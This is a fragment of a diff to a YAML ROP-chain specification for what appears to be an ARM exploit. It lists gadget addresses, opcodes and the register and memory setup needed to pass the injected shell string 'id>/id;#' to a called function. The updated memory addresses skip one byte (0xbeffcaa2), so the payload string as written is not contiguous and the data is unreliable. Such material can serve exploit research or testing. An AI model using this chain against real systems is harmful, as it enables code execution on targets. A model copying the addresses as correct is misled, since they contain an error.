@@ -49,16 +49,16 @@ ropchains:
         ['0x0000c9b8', '06 00 a0 e1', 'mov r0, r6', 'Gadget 1.0']
     - preconditions:
         regs:
-          'r0': '0xbeffc250'    # r0 == 0xbeffc0c4+396 == 0xbeffc250
+          'r0': '0xbeffcaa0'    # r0 == 0xbeffc914+396 == 0xbeffcaa0
         mems:
-          '0xbeffc250': '0x69'  # 'i'
-          '0xbeffc251': '0x64'  # 'd'
-          '0xbeffc252': '0x3e'  # '>'
-          '0xbeffc253': '0x2f'  # '/'
-          '0xbeffc254': '0x69'  # 'i'
-          '0xbeffc255': '0x64'  # 'd'
-          '0xbeffc256': '0x3b'  # ';'
-          '0xbeffc257': '0x23'  # '#'
-          '0xbeffc258': '0x00'  #
+          '0xbeffcaa0': '0x69'  # 'i'
+          '0xbeffcaa1': '0x64'  # 'd'
+          '0xbeffcaa3': '0x3e'  # '>'
+          '0xbeffcaa4': '0x2f'  # '/'
+          '0xbeffcaa5': '0x69'  # 'i'
+          '0xbeffcaa6': '0x64'  # 'd'
+          '0xbeffcaa7': '0x3b'  # ';'
+          '0xbeffcaa8': '0x23'  # '#'
+          '0xbeffcaa9': '0x00'  #
       instruction:
         ['0x0000c9bc', 'b7 f2 ff eb', 'bl #0x94a0', 'Gadget 1.1']
